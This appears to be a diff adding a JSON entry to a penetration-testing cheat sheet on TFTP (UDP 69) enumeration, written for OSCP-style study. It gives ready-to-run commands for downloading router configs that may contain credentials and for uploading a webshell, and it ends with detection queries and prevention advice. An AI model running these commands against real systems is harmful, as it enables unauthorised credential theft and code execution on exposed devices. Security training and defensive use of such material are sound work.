@@ -1,0 +1,87 @@
+{
+  "id": "recon-tftp",
+  "name": "TFTP Enumeration & File Access (UDP 69)",
+  "command": "tftp <target>",
+  "description": "TFTP (UDP 69) is an unauthenticated file-transfer service often left exposed on routers, VoIP phones, and backup systems. With no authentication, an attacker can download configs (router configs with creds), upload webshells to writable web roots, or brute-force known filenames. A quick win when UDP 69 is open: grab device configs or drop files.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Information Gathering",
+  "subcategory": "Service Enumeration",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "PEN-200 service enumeration; nmap NSE",
+  "tags": [
+    "tftp",
+    "udp-69",
+    "file-transfer",
+    "config-download",
+    "unauthenticated"
+  ],
+  "mitre": [
+    "T1046",
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CHECK THE SERVICE ===\n  nmap -sU -p69 -sV <target>\n  nmap -sU -p69 --script tftp-enum <target>   # brute common filenames\n\n=== INTERACTIVE CLIENT ===\n  tftp <target>\n  tftp> get <remote_file> <local_file>\n  tftp> put <local_file> <remote_file>\n  tftp> quit\n\n=== NON-INTERACTIVE ===\n  tftp <target> -c get running-config\n  tftp <target> -c get <file>\n  tftp <target> -c put shell.php\n  curl -o conf tftp://<target>/<file>\n\n=== COMMON FILENAMES TO GRAB (network gear) ===\n  running-config  startup-config  <hostname>-confg\n  config.text  vlan.dat  <mac>.cfg  SEP<mac>.cnf.xml  (Cisco VoIP)\n\n=== UPLOAD A WEBSHELL (if writable + served) ===\n  tftp <target> -c put shell.php\n  # Then browse to it if the TFTP root maps to the web root\n\n=== WINDOWS TFTP (exfil/transfer during an engagement) ===\n  tftp -i <target> GET file.exe        # legacy, may be disabled\n\n=== ALTERNATIVES ===\n  atftp, tftp-hpa clients; metasploit auxiliary/admin/tftp\n  nmap tftp-enum for filename brute forcing",
+  "examples": [
+    {
+      "label": "Brute common filenames",
+      "command": "nmap -sU -p69 --script tftp-enum 10.10.10.10"
+    },
+    {
+      "label": "Download router config",
+      "command": "tftp 10.10.10.10 -c get running-config"
+    },
+    {
+      "label": "Upload a file",
+      "command": "tftp 10.10.10.10 -c put shell.php"
+    }
+  ],
+  "references": [
+    {
+      "title": "HackTricks - Pentesting TFTP",
+      "url": "https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp"
+    },
+    {
+      "title": "MITRE T1046",
+      "url": "https://attack.mitre.org/techniques/T1046/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gs-nmap-service-scan",
+      "note": "Identify the UDP 69 TFTP service first.",
+      "rel": "prereq"
+    },
+    {
+      "id": "recon-vnc",
+      "note": "Another commonly-exposed unauthenticated service.",
+      "rel": "alternative"
+    },
+    {
+      "id": "lolbins-transfer",
+      "note": "TFTP is one of several LOLBin file-transfer methods.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "TFTP has no authentication or access control by design. If exposed and misconfigured, anyone who can reach UDP 69 can read or write files the service has access to.",
+    "prerequisites": "Reachable TFTP service (UDP 69) with readable/writable files.",
+    "impact": "Disclosure of sensitive configs (often with credentials); webshell/file upload leading to RCE.",
+    "detection": "[MITRE T1046/T1105] TFTP read/write requests from unexpected sources; filename brute-force bursts (many RRQ with NAK responses); UDP 69 scanning.",
+    "artifacts": "TFTP server logs of RRQ/WRQ from foreign IPs; config files leaving the device; new files in the TFTP root.",
+    "splunk_spl": "index=network dest_port=69 transport=udp\n| stats count by src_ip, dest_ip\n| where count > 10",
+    "elastic_kql": "destination.port:69 and network.transport:udp",
+    "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort == 69 and Protocol == \"Udp\"\n| summarize count() by RemoteIP, DeviceName, bin(Timestamp, 10m)\n| where count_ > 10",
+    "sigma_rules": "net_tftp_access_or_bruteforce",
+    "prevention": "Disable TFTP where not required; restrict to management VLANs and specific source IPs; use SCP/SFTP instead; never store secrets in TFTP-served configs; monitor UDP 69 access.",
+    "sources": [
+      "HackTricks",
+      "https://attack.mitre.org/techniques/T1046/"
+    ]
+  }
+}
